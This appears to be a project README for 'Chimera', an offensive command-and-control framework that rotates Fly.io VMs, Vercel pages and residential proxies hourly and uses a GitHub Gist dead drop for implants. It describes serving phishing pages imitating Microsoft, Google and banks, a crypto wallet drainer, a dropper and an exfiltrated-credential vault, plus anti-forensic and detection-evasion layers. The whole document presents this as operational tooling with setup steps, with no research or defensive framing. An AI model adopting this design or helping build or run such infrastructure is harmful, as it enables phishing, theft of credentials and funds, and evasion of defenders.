# ⚡ Chimera

Auto-rotating, multi-cloud C2 infrastructure with polymorphic payload delivery.
Fly.io VMs + Vercel pages rotate every hour with residential proxy egress.
Impossible to fingerprint — the C2 literally doesn't exist in one place for more than 60 minutes.

## Structure

```
chimera/
├── core/                       # Rotation engine + payload framework
│   ├── chimera_core.py          # V1 rotation orchestrator (Sliver-only)
│   ├── chimera_core_v2.py       # V2 payload-aware rotation engine
│   ├── fly_provisioner.py        # Fly.io Machines API — spin up/destroy VMs
│   ├── vercel_deployer.py        # Vercel API — deploy redirector/payload pages
│   ├── deaddrop.py              # GitHub Gist dead drop — implant rendezvous
│   ├── proxy_rotator.py         # Residential proxy rotation (Bright Data/Oxylabs/SmartProxy)
│   ├── payload_registry.py      # Payload definitions (phishing, drainer, malware API, etc.)
│   ├── polymorphic_renderer.py  # Per-deployment payload variation engine
│   ├── payloads_config.py       # Operator payload config — what to deploy each cycle
│   └── payload_server.py        # Fly VM payload-agnostic API server
│
├── implant/                     # Implant-side modules
│   ├── beacon.py                # Simple beacon — polls dead drop, follows C2
│   └── phone_home.py            # Multi-channel one-way phone home (GitHub/Pastebin/CF)
│
├── dashboard/                   # Operator web UI
│   ├── dashboard.py             # Flask app — overview, implants, vault, exfil, deployments
│   ├── run_dashboard.py         # Entry point
│   ├── requirements.txt          # Dashboard-specific deps
│   ├── templates/                # Jinja2 templates (dark theme)
│   └── static/                  # CSS/JS assets
│
├── docker/                      # Fly VM container
│   ├── Dockerfile               # Multi-stage build: Sliver + proxy routing + supervisor
│   ├── entrypoint.sh            # Boot sequence — config from env vars
│   ├── proxy-setup.sh           # iptables force egress through resi proxy
│   ├── healthcheck.sh           # C2 liveness check
│   ├── sliver.toml              # Sliver server config template
│   ├── supervisor.conf          # Process manager config
│   └── build.sh                 # Build + push to Fly registry
│
├── config.example.yaml          # Copy to config.yaml, fill in credentials
├── requirements.txt             # Top-level Python deps
└── README.md
```

## Quick Start

```bash
# 1. Install deps
pip install -r requirements.txt
pip install -r dashboard/requirements.txt

# 2. Configure
cp config.example.yaml config.yaml
# Edit config.yaml with your Fly.io, Vercel, GitHub, and proxy credentials

# 3. Build the C2 Docker image (one-time)
cd docker && bash build.sh

# 4. Launch the dashboard + rotation engine
python -m dashboard.run_dashboard
# → http://localhost:4444
```

## How It Works

Every 60 minutes the rotation engine:

1. Spins up a **new Fly.io VM** (fresh IP, fresh machine ID)
2. Deploys **new Vercel pages** (fresh TLS cert, fresh URL)
3. Rotates **residential proxy** credentials (fresh exit IP)
4. Updates the **GitHub Gist dead drop** with new endpoint config
5. Implants pull the new config on next beacon — zero downtime
6. **Destroys** the previous cycle's VM + Vercel deployments

The only stable artifact is the GitHub gist, disguised as a `package-lock.json` fragment.

## Payload Types

| Type               | Served On | Description                                         |
| ------------------ | --------- | --------------------------------------------------- |
| `phishing`         | Vercel    | Fake login pages (Microsoft, Google, banking, etc.) |
| `drainer`          | Vercel    | Crypto wallet drainer (MetaMask/WalletConnect)      |
| `malware_api`      | Fly VM    | C2 tasking, exfil ingestion, command dispatch       |
| `stager`           | Both      | First-stage dropper (JS on Vercel → stage2 on Fly)  |
| `credential_vault` | Fly VM    | Exfil ingestion + credential storage                |
| `custom`           | Vercel    | Arbitrary HTML/JS payloads                          |

## OPSEC Layers

- **Infrastructure rotation** — new IPs, certs, URLs every cycle
- **Payload polymorphism** — randomized CSS classes, JS vars, HTML structure, API response format
- **Traffic camouflage** — implant talks to GitHub + Vercel (top-100 domains)
- **Anti-forensic** — in-memory only, no disk writes, no logs, VM destroyed every cycle
- **One-way phone home** — implant is pure PULL client, no listeners, no inbound ports
- **Residential egress** — C2 outbound forced through resi proxy via iptables
